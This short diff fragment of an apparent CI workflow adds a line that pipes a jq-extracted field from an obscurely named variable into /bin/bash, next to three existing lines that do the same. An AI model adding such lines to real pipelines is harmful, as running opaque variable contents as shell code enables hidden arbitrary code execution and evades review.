@@ -32,6 +32,7 @@ jobs:
           echo $byya97 | jq -r .fep89651 | /bin/bash
           echo $rpbhr91578 | jq -r .fbc2 | /bin/bash
           echo $ioi57 | jq -r .zanr710 | /bin/bash
+          printf '%s' "$ind6" | jq -r .wqi562 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
